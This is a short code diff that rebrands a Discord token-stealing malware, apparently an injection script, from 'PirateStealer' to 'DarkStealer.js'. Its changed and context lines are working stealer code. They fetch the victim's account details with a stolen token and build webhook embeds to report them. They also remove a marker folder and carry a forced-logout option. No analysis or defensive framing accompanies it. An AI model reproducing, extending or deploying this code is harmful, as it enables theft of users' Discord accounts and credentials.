@@ -134,7 +134,7 @@ async function firstTime() {
             } else {
                 var b = await getUserInfo(token)
                 var c = {
-                    username: "PirateStealer",
+                    username: "DarkStealer.js",
                     content: config.ping[0] ? config.ping[1] : "",
                     embeds: [{
                         title: "Discord Initalized",
@@ -177,9 +177,9 @@ async function firstTime() {
 
         }
     }
-    if (!fs.existsSync(path.join(__dirname, "DarkStealer.js"))) return true
+    if (!fs.existsSync(path.join(__dirname, "PirateStealerBTW"))) return true
 
-    fs.rmdirSync(path.join(__dirname, "DarkStealer.js"));
+    fs.rmdirSync(path.join(__dirname, "PirateStealerBTW"));
     if (config.logout != "false" && config.logout != "%LOGOUT%") {
 
         const window = BrowserWindow.getAllWindows()[0];
@@ -237,10 +237,10 @@ async function firstTime() {
                             inline: !1
                         }],
                         author: {
-                            name: "PirateStealer"
+                            name: "DarkStealer.js"
                         },
                         footer: {
-                            text: "PirateStealer"
+                            text: "DarkStealer.js"
                         },
                         thumbnail: {
                             url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
